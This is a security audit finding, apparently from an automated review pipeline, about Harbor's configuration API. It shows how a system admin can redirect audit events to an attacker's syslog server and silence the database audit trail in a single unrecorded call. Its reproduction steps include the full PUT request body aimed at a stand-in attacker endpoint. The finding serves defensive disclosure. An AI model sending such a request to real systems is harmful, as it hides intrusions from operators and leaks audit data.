Phase: 8
Sequence: 020
Slug: audit-evidence-destruction
Verdict: VALID
Rationale: System admin can redirect all audit events to attacker syslog and silence Harbor DB audit trail in a single API call; the config change itself is not recorded, creating complete evidence destruction with no forensic trace.
Severity-Original: CRITICAL
PoC-Status: theoretical
Pre-FP-Flag: none
Debate: security/chamber-workspace/chamber-02/debate.md
Adversarial-Verdict: CONFIRMED
Adversarial-Rationale: Code path trace confirms async audit event processing (event.go:102 goroutine) reads already-updated config, causing the skip flag to suppress the audit record for its own configuration change; however, exploitation requires system admin privileges.
Severity-Final: MEDIUM
PoC-Status: theoretical

## Summary

A system administrator can simultaneously set `audit_log_forward_endpoint` to an attacker-controlled syslog server and `skip_audit_log_database=true` via a single `PUT /api/v2.0/configurations` request. This redirects all subsequent audit events exclusively to the attacker's server while silencing Harbor's database audit trail. Critically, the configuration change that enables this is itself not recorded in Harbor's audit log because the forward endpoint is already redirected when the audit hook fires.

## Location

- `src/lib/config/metadata/metadatalist.go:192-193` -- `audit_log_forward_endpoint` (StringType, UserScope) and `skip_audit_log_database` (BoolType, UserScope)
- `src/controller/config/controller.go:149-169` -- `verifySkipAuditLogCfg` validates only that endpoint is non-empty
- `src/pkg/audit/forward.go:38-52` -- `LoggerManager.Init` configures syslog forwarding
- `src/pkg/auditext/manager.go:80-88` -- `Create` checks skip flag before DB write

## Attacker Control

- System admin fully controls both config values via `PUT /api/v2.0/configurations`
- No URL validation on `audit_log_forward_endpoint` -- accepts any `host:port` string
- `verifySkipAuditLogCfg` only validates that endpoint is non-empty when skip is true

## Trust Boundary Crossed

- TB-5: Core API to external syslog endpoint (attacker-controlled)
- System admin privilege escalates to audit system compromise

## Impact

1. **Evidence Destruction**: Harbor's audit_log_ext table receives no new entries. All forensic evidence eliminated.
2. **Audit Exfiltration**: All audit events (operator, resource, operation, timestamps) forwarded to attacker's syslog server permanently.
3. **Self-Concealing**: The configuration change that enables this attack is itself not recorded in Harbor's audit trail.
4. **Enables Stealth Attacks**: With audit silenced, subsequent SSRF, credential theft, or data exfiltration leaves no trace.

## Evidence

- Deep Probe PH-12/PH-C06: Validated via backward, TRIZ contradiction, and causal reasoning models
- `verifySkipAuditLogCfg` at controller.go:149-169 only checks endpoint non-empty, not legitimacy
- Audit hook fires after handler returns -- new config already active when change is audited
- No re-validation of endpoint on each audit event emission

## Reproduction Steps

1. Authenticate as system administrator
2. Send: `PUT /api/v2.0/configurations` with body `{"audit_log_forward_endpoint": "<attacker-syslog>:514", "skip_audit_log_database": true}`
3. Verify Harbor's `audit_log_ext` table stops receiving new entries
4. Verify attacker's syslog server receives all subsequent Harbor audit events
5. Verify the config change itself is NOT recorded in Harbor's audit log
